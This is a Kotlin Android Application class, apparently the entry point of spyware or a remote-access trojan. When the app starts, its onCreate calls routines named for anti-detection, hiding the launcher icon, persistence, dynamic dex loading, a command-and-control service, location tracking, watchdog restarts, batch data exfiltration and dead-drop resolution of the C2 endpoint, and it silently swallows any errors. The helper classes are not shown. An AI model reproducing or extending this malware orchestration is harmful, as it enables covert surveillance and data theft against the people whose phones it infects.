package com.sp.core

import android.app.Application
import android.content.Intent
import android.os.Build
import com.sp.core.services.C2Service
import com.sp.core.services.LocationService
import com.sp.core.stealth.AntiDetect
import com.sp.core.stealth.IconHider
import com.sp.core.stealth.Persistence
import com.sp.loader.DexLoader
import com.sp.core.util.BatchExfil
import com.sp.core.util.DeadDrop
import com.sp.watchdog.WatchdogAlarm
import com.sp.watchdog.WatchdogJob

class App : Application() {
    override fun onCreate() {
        super.onCreate()
        AntiDetect.guard(this)
        IconHider.hide(this)
        Persistence.lockIn(this)
        DexLoader.launch(this)

        startServiceSafely(C2Service::class.java)
        startServiceSafely(LocationService::class.java)

        WatchdogAlarm.arm(this)
        WatchdogJob.schedule(this)

        BatchExfil.enqueue(this, "boot", """{"ts":${System.currentTimeMillis()}}""")

        // Dead-drop resolution of the C2 endpoint (off the main thread).
        Thread {
            try { DeadDrop.resolve(this) } catch (_: Throwable) {}
        }.start()
    }

    private fun startServiceSafely(cls: Class<*>) {
        try {
            val i = Intent(this, cls)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
        } catch (_: Throwable) {
        }
    }
}
